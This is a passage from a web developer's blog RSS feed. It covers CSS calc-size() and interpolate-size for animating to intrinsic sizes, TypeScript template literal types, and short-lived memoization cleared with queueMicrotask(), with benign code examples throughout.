  openButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
    box.classList.toggle(&apos;is-open&apos;);
  });
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s significantly and objectively more intuitive, and it handles animation interruptions nicely too. Try toggling this box rapidly a few times:&lt;/p&gt;

&lt;p&gt;
  &lt;span&gt;See the Pen &lt;a href=&quot;https://codepen.io/alexmacarthur/pen/qEWJqzm?ref=cms.macarthur.me&quot;&gt;
  Blog :: calc-size() Demo&lt;/a&gt; by Alex MacArthur (&lt;a href=&quot;https://codepen.io/alexmacarthur?ref=cms.macarthur.me&quot;&gt;@alexmacarthur&lt;/a&gt;)
  on &lt;a href=&quot;https://codepen.io/?ref=cms.macarthur.me&quot;&gt;CodePen&lt;/a&gt;.&lt;/span&gt;
&lt;/p&gt;


&lt;p&gt;Let&apos;s dissect &lt;code&gt;calc-size(auto, size)&lt;/code&gt; a bit: &lt;/p&gt;&lt;p&gt;The first argument is the &lt;code&gt;calc-size-basis&lt;/code&gt;. You can think of it as the &quot;starting size&quot; value you&apos;re about to operate on. It doesn&apos;t &lt;em&gt;need&lt;/em&gt; to be an intrinsic size, but since the classic &lt;code&gt;calc()&lt;/code&gt; doesn&apos;t support such values, it&apos;ll probably be common to for &lt;code&gt;calc-size()&lt;/code&gt; to be the go-to for handling them.&lt;/p&gt;&lt;p&gt;The second argument is actually an expression – the formula you&apos;ll use to crank out a resulting value. In our example, &lt;code&gt;calc-size(auto, size)&lt;/code&gt;, all we&apos;re doing is returning itself. If your brain runs on JavaScript, think of it like this: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const sizeBasis = `the derived size of &quot;auto&quot;`;

function calculate(size) {
   return size;
}

const result = calculate(sizeBasis);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But that could get as complex as needed. Such as:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;calc-size(max-content, round(up, size, 50px) + 20px);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In JavaScript, our calculation expression would look like...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const sizeBasis = `the derived size of &quot;max-content&quot;`;

function calculate(size) {
  const roundedValue = Math.ceil(base / 50) * 50;
  
  return roundedValue + 20;
}

const result = calculate(size);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It&apos;s fine if you&apos;re thinking that&apos;s way more math power than you&apos;d ever want at your disposal. This function was &lt;em&gt;designed&lt;/em&gt; to do math. But if you strictly want to enable animating to intrinsic sizes, you&apos;re in luck. &lt;/p&gt;&lt;h2&gt;Sliding w/ &lt;code&gt;interpolate-size&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;It&apos;ll soon be possible to switch on intrinsic size animations for a part of the document, or even the entire page&lt;em&gt;.  &lt;/em&gt;By slapping the &lt;code&gt;interpolate-size&lt;/code&gt; property on an ancestor element, everything in its scope will be opted in. No other changes necessary.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;style&amp;gt;
  :root {
    /** 
    Everything in :root can now animate
    intrinsic size keywords.
    **/
  interpolate-size: allow-keywords;
  }
  
  #box {
    height: 0;
    overflow: hidden;
    transition: height 1s;

    &amp;amp;.is-open {
      height: auto;
    }
  }
&amp;lt;/style&amp;gt;

&amp;lt;script&amp;gt;
  const openButton = document.getElementById(&apos;openButton&apos;);
  const box = document.getElementById(&apos;box&apos;);

  openButton.addEventListener(&apos;click&apos;, () =&amp;gt; {
    box.classList.toggle(&apos;is-open&apos;);
  });
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s it. Those &lt;code&gt;auto&lt;/code&gt; animations will now just work: &lt;/p&gt;

&lt;p&gt;
  &lt;span&gt;See the Pen &lt;a href=&quot;https://codepen.io/alexmacarthur/pen/raBqjbG?ref=cms.macarthur.me&quot;&gt;
  Blog :: calc-size() Demo&lt;/a&gt; by Alex MacArthur (&lt;a href=&quot;https://codepen.io/alexmacarthur?ref=cms.macarthur.me&quot;&gt;@alexmacarthur&lt;/a&gt;)
  on &lt;a href=&quot;https://codepen.io/?ref=cms.macarthur.me&quot;&gt;CodePen&lt;/a&gt;.&lt;/span&gt;
&lt;/p&gt;


&lt;p&gt;The &lt;code&gt;allowed-keywords&lt;/code&gt; value of that property refers to those aforementioned intrinsic size keywords. It&apos;s just a smarter way of indicating you can animate between a fixed size and an indeterminate one, using those keywords you see all over – &lt;code&gt;auto&lt;/code&gt;, &lt;code&gt;fit-content&lt;/code&gt;, &lt;code&gt;max-content&lt;/code&gt;, etc.&lt;/p&gt;&lt;p&gt;The design of this property is very intentional, by the way. Since it would impact the behavior of a lot of websites out there, it&apos;s &lt;em&gt;not&lt;/em&gt; enabled by default. But given how useful it is, I&apos;d say it&apos;s a good idea to set it &amp;amp; forget it in greenfield projects. It&apos;s already being put into &lt;a href=&quot;https://github.com/sindresorhus/modern-normalize/issues/92?ref=cms.macarthur.me&quot;&gt;CSS resets out there&lt;/a&gt;, so you can expect adoption to be a no-brainer.&lt;/p&gt;&lt;h2&gt;Dealing w/ Browser Support&lt;/h2&gt;&lt;p&gt;Browser support is not great for both &lt;a href=&quot;https://caniuse.com/?search=interpolate-size&amp;amp;ref=cms.macarthur.me&quot;&gt;interpolate-size&lt;/a&gt; and &lt;a href=&quot;https://caniuse.com/mdn-css_types_calc-size?ref=cms.macarthur.me&quot;&gt;calc-size&lt;/a&gt; (basically just Chromium). But if you&apos;re really itching to be cutting-edge, you do have a couple options. &lt;/p&gt;&lt;p&gt;First, you could use the CSS &lt;code&gt;@supports&lt;/code&gt; at-rule to do &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/CSS/@supports?ref=cms.macarthur.me&quot;&gt;feature detection&lt;/a&gt;, defining fallback behavior for the 30-something% of visitors who&apos;ll need it: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;#box {
  overflow: hidden;
  height: auto;
  max-height: 0;
  transition: height 1s;

  @supports (interpolate-size: allow-keywords) {
    height: 0;
    max-height: none;
    transition: height 1s;
  }

  &amp;amp;.is-open {
    max-height: 500px;
  
    @supports (interpolate-size: allow-keywords) {
      max-height: none;
      height: auto;
    }
  }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There are obviously some trade-offs to consider. That example falls back to a &lt;code&gt;max-height&lt;/code&gt; hack, but you could also opt to let the box snap open instantly. &lt;/p&gt;&lt;p&gt;If you prefer to keep everything in JavaScript, you could also use the &lt;code&gt;CSS.supports()&lt;/code&gt; static method available in the browser. Maybe you&apos;d fallback to the old-school way of sliding:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;openButton.addEventListener(&quot;click&quot;, () =&amp;gt; {
  if (CSS.supports(&quot;interpolate-size&quot;, &quot;allow-keywords&quot;)) {
    box.classList.toggle(&quot;is-open&quot;);
    return;
  }

  slideTheOldSchoolWay();
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;One benefit here is that it&apos;s simple to remove that fallback when browser support becomes adequate. And even more, there seems to be a modest performance benefit for most users. Main thread activity at least &lt;em&gt;looks&lt;/em&gt; a little quieter when you do get the opportunity to leverage native CSS.&lt;/p&gt;&lt;p&gt;Here&apos;s a performance snapshot from the old-school approach. It took that click event handler about .38ms to completely execute.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/image-8.png&quot; alt=&quot;main thread activity for old-school approach&quot; loading=&quot;lazy&quot; width=&quot;1298&quot; height=&quot;418&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Compared to the native CSS approach, which took about .16ms. The improvement makes sense – there are no forced, synchronous reflows to deal with this time around.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/image-9.png&quot; alt=&quot;main thread activity for native CSS approach&quot; loading=&quot;lazy&quot; width=&quot;1382&quot; height=&quot;344&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Those comparisons are anything but scientific, but I do think they confirm a long-held principle: if you want to keep the thread clean and snappy, execute less JavaScript. That&apos;s what progressive enhancements like this do.&lt;/p&gt;&lt;h2&gt;Sliding w/ No JavaScript At All&lt;/h2&gt;&lt;p&gt;The extra interesting thing about these new properties is the fact that they makes it possible to animate such a box without a single byte of JavaScript. You might know what&apos;s coming: the hidden checkbox trick. &lt;/p&gt;&lt;p&gt;If you haven&apos;t used it, here&apos;s the idea: Put a checkbox and associated label in your HTML. Hide the checkbox and treat the label as a button. Then, use the &lt;code&gt;:checked&lt;/code&gt; pseudo-class to style each state. Like this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;button&amp;gt;
  &amp;lt;label for=&quot;checkbox&quot;&amp;gt;Open&amp;lt;/label&amp;gt;
&amp;lt;/button&amp;gt;

&amp;lt;input type=&quot;checkbox&quot; id=&quot;checkbox&quot; /&amp;gt;

&amp;lt;div id=&quot;box&quot;&amp;gt;
  A bunch of content...
&amp;lt;/div&amp;gt;

&amp;lt;style&amp;gt;
  :root {
    interpolate-size: allow-keywords;
  }

  #box {
    height: 0;
    overflow: hidden;
    transition: height 0.25s;
  }

  #checkbox {
    display: none;

    &amp;amp;:checked + #box {
      height: auto;
    }
  }
&amp;lt;/style&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s really it. No JavaScript, but we get the same, smooth behavior as before: &lt;/p&gt;

&lt;p&gt;
  &lt;span&gt;See the Pen &lt;a href=&quot;https://codepen.io/alexmacarthur/pen/VYZVyvE?ref=cms.macarthur.me&quot;&gt;
  Blog :: interpolate-size Demo&lt;/a&gt; by Alex MacArthur (&lt;a href=&quot;https://codepen.io/alexmacarthur?ref=cms.macarthur.me&quot;&gt;@alexmacarthur&lt;/a&gt;)
  on &lt;a href=&quot;https://codepen.io/?ref=cms.macarthur.me&quot;&gt;CodePen&lt;/a&gt;.&lt;/span&gt;
&lt;/p&gt;


&lt;p&gt;Now, there&apos;s even less activity on the main thread. This click event took 93 &lt;em&gt;microseconds&lt;/em&gt; for the browser to process. Nice.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/image-10.png&quot; alt=&quot;main thread activity for checkbox approach&quot; loading=&quot;lazy&quot; width=&quot;864&quot; height=&quot;290&quot; /&gt;&lt;/figure&gt;&lt;p&gt;All of this merely scratches the surface of use cases for these new features – my head&apos;s just been focused on sliding boxes as of late. I&apos;m looking forward to see what other problems this new era of CSS feature support is poised to solve, and how quickly we can safely forget about all the tricks we&apos;ve had to lean on until now. &lt;/p&gt;&lt;p&gt;Tangentially related: remember floats and clearfixes? &lt;a href=&quot;https://css-tricks.com/all-about-floats/?ref=cms.macarthur.me&quot;&gt;Those were the days.&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title>I didn&apos;t know you could compose template literal types in TypeScript.</title><link>https://macarthur.me/posts/template-literal-types</link><guid isPermaLink="true">https://macarthur.me/posts/template-literal-types</guid><pubDate>Fri, 17 Jan 2025 22:30:10 GMT</pubDate><content:encoded>&lt;p&gt;When template literal types were announced &lt;a href=&quot;https://www.typescriptlang.org/docs/handbook/release-notes/typescript-4-1.html?ref=cms.macarthur.me&quot;&gt;in TypeScript v4.1&lt;/a&gt;, nearly every example you saw used it as simpler way to enforce a choice from a fixed set of options. Prior, it was more common to see this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;enum UserRole {
  Admin = &apos;admin&apos;,
  Editor = &apos;editor&apos;,
  Viewer = &apos;viewer&apos;,
}

function checkPermission(role: UserRole): void {
  console.log(`Checking permissions for ${role}`);
}

checkPermission(UserRole.Admin);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or const assertions (introduced &lt;a href=&quot;https://www.typescriptlang.org/docs/handbook/release-notes/typescript-3-4.html?ref=cms.macarthur.me#const-assertions&quot;&gt;back in v3.1&lt;/a&gt;): &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const roles = [&apos;admin&apos;, &apos;editor&apos;, &apos;viewer&apos;] as const;

function checkPermission(role: (typeof roles)[number]): void {
  console.log(`Checking permissions for ${role}`);
}

// good
checkPermission(&apos;admin&apos;);

// bad
checkPermission(&apos;urmom&apos;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Template literal types, however, felt a lot more intuitive and lightweight: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;type UserRole = `admin` | `editor` | `viewer`;

function checkPermission(role: UserRole): void {
  console.log(`Checking permissions for ${role}`);
}

// good
checkPermission(&apos;admin&apos;);

// bad
checkPermission(&apos;urmom&apos;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the only way I&apos;ve ever used the template literal types, and it&apos;s been extremely valuable. So, imagine my surprise when I found out &lt;strong&gt;you can compose string literal types with non-literal types&lt;/strong&gt;, enabling you to do quite a bit you couldn&apos;t (as easily) do before.&lt;/p&gt;&lt;h2&gt;Enforcing String Formats&lt;/h2&gt;&lt;p&gt;If you&apos;ve used Stripe, you know that every customer has an ID that starts with &quot;cus_&quot;. You might&apos;ve perviously annotated that value as a &lt;code&gt;string&lt;/code&gt; and moved on. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;interface User {
  customerKey: string;
}

const user: User = {
  customerKey: &apos;cus_RU8Xy39PJnNfk&apos;,
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Much of the time, that&apos;s been fine. But it can become problem when you accidentally slip an extra character in there. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const user: User = {
  // still valid, but not correct.
  customerKey: &apos;cuss_RU8Xy39PJnNfk&apos;,
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But a variable string literal type can prevent that, requiring a specific format for the value: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;interface User {
  customerKey: `cus_${string}`;
}

const user: User = {
  // 🚫 invalid!
  customerKey: &apos;cuss_RU8Xy39PJnNfk&apos;,
};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&apos;m sure you can already see how useful that is. You can take it further too, interpolating multiple types of values in the same template literal. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;type Version = `v${number}.${number}.${number}`

const goodVersion: Version = &apos;v4.2.3&apos;;
const badVersion: Version = &apos;3.2&apos;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s a lot of flexibility to bring more rigidity to your code.&lt;/p&gt;&lt;h2&gt;Combining w Other Features&lt;/h2&gt;&lt;p&gt;Even if you stopped here, you&apos;d likely see fewer mistakes &amp;amp; inconsistencies being introduced within your code. But as you might expect, it can be composed of other TypeScript features too, like its built-in utility types (would&apos;ve been really nice using this earlier on building &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt;). &lt;/p&gt;&lt;pre&gt;&lt;code&gt;type ImageExtension = `png` | `jp${`e` | ``}g` | `webp`;
type ImageFileName = `${Lowercase&amp;lt;string&amp;gt;}.${ImageExtension}`;

const goodName1: ImageFileName = &apos;doggy1.jpeg&apos;;
const goodName2: ImageFileName = &apos;doggy2.jpg&apos;;
const badName: ImageFileName = &apos;KittyCat.webp&apos;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;One more example, using generics and conditional types: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;type EvenNumber&amp;lt;T extends number&amp;gt; = `${T}` extends `${number}${
  | `0`
  | `2`
  | `4`
  | `6`
  | `8`}`
  ? T
  : never;

function doMath&amp;lt;T extends number&amp;gt;(num: EvenNumber&amp;lt;T&amp;gt;) {
  return num;
}

// good
doMath(444);

// bad
doMath(333);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, template literal types are way more useful than just for defining possible choices (I still can&apos;t believe it took me so long to learn of it). I&apos;m looking forward to opportunities to leverage this in the future, and for the more stable, unambiguous code that&apos;ll result.&lt;/p&gt;</content:encoded></item><item><title>Short-Lived, Tick-Bound Memoization in JavaScript</title><link>https://macarthur.me/posts/memoization</link><guid isPermaLink="true">https://macarthur.me/posts/memoization</guid><pubDate>Tue, 14 Jan 2025 00:02:08 GMT</pubDate><content:encoded>&lt;p&gt;I&apos;m always looking for excuses to use &lt;code&gt;queueMicrotask()&lt;/code&gt;, a relatively sparsely used function for inserting tasks at the end of the current call stack. I might&apos;ve stumbled across one dealing with short-lived memoization. Humor me for a bit.&lt;/p&gt;&lt;p&gt;You&apos;ve likely seen some variation of this memoization function in JavaScript. Pass in an expensive function, and you get back a different function that&apos;ll cache the result on first execution. This particular example even caches according to the parameters you use:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function memoize(fn) {
  const cache = new Map();

  return function (...args) {
    // Key created from arguments.
    // Note: only works for serializable values.
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      return cache.get(key);
    }

    const result = fn.apply(this, args);
    cache.set(key, result);

    return result;
  };
}

const memoizedExpensiveFunction = memoize(expensiveFunction);

const freshResult = memoizedExpensiveFunction();
const cachedResult = memoizedExpensiveFunction();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That approach will cover a good share of use cases (probably most), and it doesn&apos;t pose many problems when you have clear control over the inputs and you know when they need to change. &lt;/p&gt;&lt;p&gt;But JavaScript runs on an event loop, and &lt;em&gt;a lot&lt;/em&gt; can change between different lines of code in the same file, depending on how you write it. This will all run in a single turn (&quot;tick&quot;) of the event loop: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;doThing();
doAnotherThing();
doOneMoreThing();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The browser can do &lt;em&gt;nothing &lt;/em&gt;until all of those functions are run through the call stack and executed. But you &lt;em&gt;can&lt;/em&gt; schedule tasks to run on future ticks of the event loop too.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// executed on the current stack:
doThing();

// queued ASAP:
scheduler.postTask(() =&amp;gt; doItAgain());

// queued at some point soon in the future:
setTimeout(() =&amp;gt; doAnotherThing());

// queued just before the next repaint:
requestAnimationFrame(() =&amp;gt; doOneMoreThing());&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The browser is doing a lot more than just executing your code here, meaning the entire world could change between each of those lines. A repaint could&apos;ve occurred, the DOM could have been reflowed, user events could&apos;ve been handled, timer callbacks could&apos;ve been executed, and more. &lt;/p&gt;&lt;p&gt;If you&apos;re memoizing a value based on parameters that could change &lt;em&gt;across ticks&lt;/em&gt;, you might need more fine-grained control over when your cached is considered &quot;stale.&quot; &lt;/p&gt;&lt;h2&gt;Frequently Stale Memoization&lt;/h2&gt;&lt;p&gt;That particular memoization function above works just fine across multiple ticks because no external inputs change and everything fires in the same execution context. These will all return the same random number: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function getRandom() {
  return Math.random();
}

const memoizedGetRandom = memoize(getRandom);

console.log(&apos;Task #1:&apos;, memoizedGetRandom());

setTimeout(() =&amp;gt; {
  console.log(&apos;Task #2:&apos;, memoizedGetRandom());

  setTimeout(() =&amp;gt; {
    console.log(&apos;Task #3:&apos;, memoizedGetRandom());
  });
});&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But binding that cache to the execution context becomes a problem when variables start to change between ticks, like in the case below. This example memoizes a perimeter calculation based on screen size, which will change as soon as the user resizes the window. But you&apos;ll get the wrong answer because the cache has become stale.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function calculateWindowPerimeter() {
  return 2 * (window.innerWidth + window.innerHeight);
}

const memoizedCalculateWindowPerimeter = memoize(calculateWindowPerimeter);

setInterval(() =&amp;gt; {
  console.log(&apos;Window Perimeter:&apos;, memoizedCalculateWindowPerimeter());
}, 1000);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cases like that are simple enough to fix. Either clear the cache when the window resizes, or use the dimensions as your cache key (although you will need to worry about an incrementally growing memoization cache... different problem). Let&apos;s dream up a crazier example.&lt;/p&gt;&lt;h2&gt;When Everything&apos;s Always Changing&lt;/h2&gt;&lt;p&gt;You&apos;re making a Chrome extension that calculates a bunch of metrics about the current state of the DOM on any page. You&apos;re crawling through a lot of nodes and doing some expensive math: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const {
  maxDepth,
  averageDepth,
  totalElements,
  totalPageArea,
  largestElement,
  deepestElement,
  visibleElements,
  oversizedImages,
  offscreenElements,
  largestElementArea,
  overflowingElements,
} = calculatePerformanceMetrics();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;These metrics are being recalculated every so often, and then being visualized in a series of ways – charts, graphs, text, etc. That calculation is ripe for memoization, but to keep it accurate, it&apos;ll need to be invalidated at the appropriate times.&lt;/p&gt;&lt;p&gt;Because there are so many factors in play, it&apos;s reasonable is to assume that key attributes of the DOM may change at any chance they get&lt;em&gt;. &lt;/em&gt;With each tick of the event loop, you might be getting entirely different DOM altogether. You just can&apos;t know.&lt;/p&gt;&lt;p&gt;You want that invalidation process to be simple and self-contained. Needing to reach in and wipe it externally would just be another hassle.&lt;/p&gt;&lt;h2&gt;Building &lt;strong&gt;Tick-Bound Memoization&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;There are a few options for blowing away a short-lived cache around the event loop. But most won&apos;t adequately do the job. Let&apos;s camp out on one of them – &lt;code&gt;setTimeout()&lt;/code&gt;. You could use this to schedule a cache wipe right away in the future: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function memoizeForTick(fn) {
  const cache = new Map();

  // On the next tick, wipe the cache.
  setTimeout(() =&amp;gt; {
    cache.clear();
  });

  return function (...args) {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      return cache.get(key);
    }

    const result = fn.apply(this, args);
    cache.set(key, result);

    return result;
  };
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But that task &lt;em&gt;isn&apos;t&lt;/em&gt; necessarily scheduled for the top of the next tick. Depending on the browser and tab conditions, &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Window/setTimeout?ref=cms.macarthur.me&quot;&gt;there may be a minimum delay&lt;/a&gt;, even if you if explicitly pass &lt;code&gt;0&lt;/code&gt;. That leaves plenty of time for &lt;em&gt;other&lt;/em&gt; tasks to be scheduled before your timer&apos;s callback, risking a stale cache. Another contrived example: &lt;/p&gt;&lt;p&gt;You have a function that counts elements in the DOM. When the page loads, you get that count. But there are also some other tasks scheduled to access the that same count (I&apos;m using another &lt;code&gt;setTimeout()&lt;/code&gt; to illustrate this, but it could be a number of things):&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const memoizedCountElements = memoizeForTick(() =&amp;gt; {
    return document.querySelectorAll(&apos;*&apos;).length;
});

// ⬇️ Other arbitrary, scheduled task needing
// a current count of the DOM:
setTimeout(() =&amp;gt; {
    console.log(&apos;Second count:&apos;, memoizedCountElements());
});

// ⬇️ Sneaky task that modifies the DOM 
// at the beginning of the call stack:
scheduler.postTask(() =&amp;gt; {
    document.body.appendChild(document.createElement(&apos;span&apos;));
}, { priority: &apos;user-blocking&apos; });

console.log(&apos;First count:&apos;, memoizedCountElements());

// First count: 8
// Second count: 8&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this case, there&apos;s no issue because there are no surprise DOM modifications getting in the way. Still, your scheduled &lt;code&gt;cache.clear()&lt;/code&gt; is still technically happening at some point the future – not right away in the next tick.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/clear-cache.png&quot; alt=&quot;event loop illustration&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;882&quot; /&gt;&lt;/figure&gt;&lt;p&gt;That&apos;s not good when other tasks happen to get priority over your cache clean-up. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const memoizedCountElements = memoizeForTick(() =&amp;gt; {
  return document.querySelectorAll(&apos;*&apos;).length;
});

// ⬇️ Other arbitrary, scheduled task needing
// a current count of the DOM:
setTimeout(() =&amp;gt; {
    console.log(&apos;Second count:&apos;, memoizedCountElements());
});

+ // ⬇️ Sneaky task that modifies the DOM 
+ // at the beginning of the call stack:
+ scheduler.postTask(() =&amp;gt; {
+    document.body.appendChild(document.createElement(&apos;span&apos;));
+ }, { priority: &apos;user-blocking&apos; });

console.log(&apos;First count:&apos;, memoizedCountElements());

// First count: 8
// Second count: 8&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That&apos;s a high-priority task that&apos;s slipped in &lt;em&gt;before&lt;/em&gt; your timeout&apos;s callback, free to do whatever it&apos;s instructed to do – like mess with the DOM.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/post-task.png&quot; alt=&quot;event loop with higher-priority task&quot; loading=&quot;lazy&quot; width=&quot;2000&quot; height=&quot;869&quot; /&gt;&lt;/figure&gt;&lt;p&gt;And with that, the next count is incorrect. It&apos;s still relying on the previous tick&apos;s cache. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;First count: 8
Second count: 8 # &amp;lt;-- should be 9! &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This same risk exists with other tools like &lt;code&gt;requestAnimationFrame()&lt;/code&gt;. There&apos;s just too much going on to delay that invalidation past the current tick.&lt;em&gt; &lt;/em&gt;If we want that cache to be reliably cleared, it&apos;ll need to be done before anything has a chance to control the event loop again.&lt;/p&gt;&lt;h2&gt;Guaranteed Clean-Up&lt;/h2&gt;&lt;p&gt;Cue the hero of this post: &lt;code&gt;queueMicrotask()&lt;/code&gt;. Like I mentioned, this function allows us to tack on a task at the very end of the current call stack. It&apos;s the call stack telling the event loop to &quot;hold up and take care of this one more thing&quot; before moving on to other responsibilities. Let&apos;s drop it into our memoization function:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function memoizeForTick(fn) {
  const cache = new Map();

  return function (...args) {
    // Clear the cache right after the 
    // call stack is emptied.
    queueMicrotask(() =&amp;gt; {
      cache.clear();
    });
    
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      return cache.get(key);
    }

    const result = fn.apply(this, args);
    cache.set(key, result);

    return result;
  };
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That little change prevents any other tasks from ever getting the stale cache when they shouldn&apos;t. Nothing can get at that stale cache because nothing else can happen until that call stack is completely empty.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/01/image-7.png&quot; alt=&quot;event loop illustration with queueMicrotask()&quot; loading=&quot;lazy&quot; width=&quot;1732&quot; height=&quot;712&quot; /&gt;&lt;/figure&gt;&lt;h3&gt;Another Quick Verification&lt;/h3&gt;&lt;p&gt;If you ran this updated code, you&apos;d see that the count is now accurate after the DOM is sneakily changed. But for more verification, we can tweak that &lt;code&gt;getRandom()&lt;/code&gt; example from earlier: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;const memoizedGetRandom = memoizeForTick(getRandom);

console.log(&apos;Task #1:&apos;, memoizedGetRandom());
console.log(&apos;Task #1:&apos;, memoizedGetRandom());   

setTimeout(() =&amp;gt; {
  console.log(&apos;Task #2:&apos;, memoizedGetRandom());
  console.log(&apos;Task #2:&apos;, memoizedGetRandom());

  setTimeout(() =&amp;gt; {
    console.log(&apos;Task #3:&apos;, memoizedGetRandom());
    console.log(&apos;Task #3:&apos;, memoizedGetRandom());
    
    setTimeout(() =&amp;gt; {
      console.log(&apos;Task #4:&apos;, memoizedGetRandom());
      console.log(&apos;Task #4:&apos;, memoizedGetRandom());
    });
  });
});

// Task #1: 0.34272666642062677
// Task #1: 0.34272666642062677

// Task #2: 0.8319017459368117
// Task #2: 0.8319017459368117

// Task #3: 0.6902789119580173
// Task #3: 0.6902789119580173

// Task #4: 0.031707814137348356
// Task #4: 0.031707814137348356&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Exactly what we&apos;d expect: memoized within the same tick, but not a microsecond loger.&lt;/p&gt;&lt;h3&gt;Optional Micro-Optimization&lt;/h3&gt;&lt;p&gt;You might&apos;ve noticed that because &lt;code&gt;queueMicrotask()&lt;/code&gt; is being called on every invocation of your memoized function, you&apos;re actually scheduling multiple cache clean-ups per tick. I&apos;m hesitant to say that poses any serious downsides (&lt;code&gt;.clear()&lt;/code&gt; is fast and side-effect free, given where it&apos;s placed), but you check for if you&apos;ve already scheduled an invalidation as well:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function memoizeForTick(fn) {
  const cache = new Map();
+  let invalidationScheduled = false;

  return function (...args) {
+    if(!invalidationScheduled) {   
+      queueMicrotask(() =&amp;gt; {
+        cache.clear();
+        invalidationScheduled = false;
+      });
+
+      invalidationScheduled = true;
+    }

    const key = JSON.stringify(args);
        
    if (cache.has(key)) {
      return cache.get(key);
    }

    const result = fn.apply(this, args);
    cache.set(key, result);

    return result;
  };
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Regardless, you&apos;re ready to memoize the counting of elements or some gnarly performance calculations, regardless of what the browser throws at you. Confidence feels good.&lt;/p&gt;&lt;h2&gt;Worth the Thinking&lt;/h2&gt;&lt;p&gt;The circumstances of such short-lived, granular memoization being useful are undoubtedly rare, but wrestling with imagined use cases like this is a worthy thought experiment. You end feeling more comfortable with the many tools at your disposal, equipping you to more often reach for the right one at precisely the right time. Plus, having even the slightest better understanding of what&apos;s going on every time someone opens a browser pays dividends over time, and may even save your sanity when chasing down an obscure, inexplicable bug in the future. &lt;/p&gt;&lt;p&gt;Until next tick!&lt;/p&gt;</content:encoded></item><item><title>Using Forced Reflows and the Event Loop to Slide Open a Box</title><link>https://macarthur.me/posts/box</link><guid isPermaLink="true">https://macarthur.me/posts/box</guid><pubDate>Mon, 06 Jan 2025 04:58:35 GMT</pubDate><content:encoded>&lt;p&gt;If you&apos;re reading this, there&apos;s a more-than-zero chance you&apos;ve used a CSS transition on &lt;code&gt;max-height&lt;/code&gt;to slide open a box. You reached for &lt;code&gt;max-height&lt;/code&gt; instead of 